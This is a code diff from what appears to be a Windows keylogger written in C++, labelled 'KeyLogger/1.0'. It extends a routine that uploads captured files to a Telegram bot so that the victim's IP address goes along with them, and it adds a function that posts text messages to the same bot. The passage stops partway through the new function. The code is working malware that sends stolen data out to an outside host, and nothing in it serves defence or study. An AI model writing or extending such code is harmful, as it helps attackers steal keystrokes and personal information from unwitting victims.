@@ -4,8 +4,10 @@
 #include <fstream>
 #include <vector>
 #include <iostream>
+#include "get_system_info.h"
 
 #pragma comment(lib, "winhttp.lib")
+#pragma execution_character_set("utf-8")
 
 std::vector<char> readFile(const std::wstring& filePath) {
     std::vector<char> data;
@@ -30,7 +32,7 @@ std::vector<char> readFile(const std::wstring& filePath) {
 void sendFileToTelegram(const std::wstring& token, const std::wstring& chat_id, const std::wstring& filePath) {
     std::vector<char> fileData = readFile(filePath);
     if (fileData.empty()) {
-        std::wcout << L"File is empty\n";
+        std::wcout << L"Файл пустой\n";
         return;
     }
 
@@ -50,7 +52,14 @@ void sendFileToTelegram(const std::wstring& token, const std::wstring& chat_id, 
     size_t fileStart = body.size();
     body.resize(body.size() + fileData.size());
     memcpy(&body[fileStart], fileData.data(), fileData.size());
-    body += "\r\n--" + boundaryA + "--\r\n";
+    body += "\r\n";
+
+    std::string caption = getIpAdress();
+    body += "--" + boundaryA + "\r\n";
+    body += "Content-Disposition: form-data; name=\"caption\"\r\n\r\n";
+    body += caption + "\r\n";
+
+    body += "--" + boundaryA + "--\r\n";
 
     HINTERNET hSession = WinHttpOpen(L"KeyLogger/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
     if (!hSession) return;
@@ -66,7 +75,6 @@ void sendFileToTelegram(const std::wstring& token, const std::wstring& chat_id, 
                                             NULL, WINHTTP_NO_REFERER,
                                             WINHTTP_DEFAULT_ACCEPT_TYPES,
                                             WINHTTP_FLAG_SECURE);
-
     if (!hRequest) {
         WinHttpCloseHandle(hConnect);
         WinHttpCloseHandle(hSession);
@@ -74,6 +82,45 @@ void sendFileToTelegram(const std::wstring& token, const std::wstring& chat_id, 
     }
 
     std::wstring headers = L"Content-Type: multipart/form-data; boundary=" + boundary;
+    BOOL bResults = WinHttpSendRequest(hRequest,
+                                       headers.c_str(), (DWORD)-1L,
+                                       (LPVOID)body.data(), (DWORD)body.size(),
+                                       (DWORD)body.size(), 0);
+
+    if (bResults)
+        WinHttpReceiveResponse(hRequest, NULL);
+
+    WinHttpCloseHandle(hRequest);
+    WinHttpCloseHandle(hConnect);
+    WinHttpCloseHandle(hSession);
+}
+
+void sendMessageToTelegram(const std::wstring& token, const std::wstring& chat_id, const std::wstring& message) {
+    std::string body = "chat_id=" + std::string(chat_id.begin(), chat_id.end()) +
+                       "&text=" + std::string(message.begin(), message.end());
+
+    HINTERNET hSession = WinHttpOpen(L"KeyLogger/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+    if (!hSession) return;
+
+    HINTERNET hConnect = WinHttpConnect(hSession, L"api.telegram.org", INTERNET_DEFAULT_HTTPS_PORT, 0);
+    if (!hConnect) {
+        WinHttpCloseHandle(hSession);
+        return;
+    }
+
+    std::wstring path = L"/bot" + token + L"/sendMessage";
+    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", path.c_str(),
+                                            NULL, WINHTTP_NO_REFERER,
+                                            WINHTTP_DEFAULT_ACCEPT_TYPES,
+                                            WINHTTP_FLAG_SECURE);
+
+    if (!hRequest) {
+        WinHttpCloseHandle(hConnect);
+        WinHttpCloseHandle(hSession);
+        return;
+    }
+
+    std::wstring headers = L"Content-Type: application/x-www-form-urlencoded";
     BOOL bResults = WinHttpSendRequest(hRequest,
                                        headers.c_str(), (DWORD)-1L,
                                        (LPVOID)body.data(), (DWORD)body.size(),
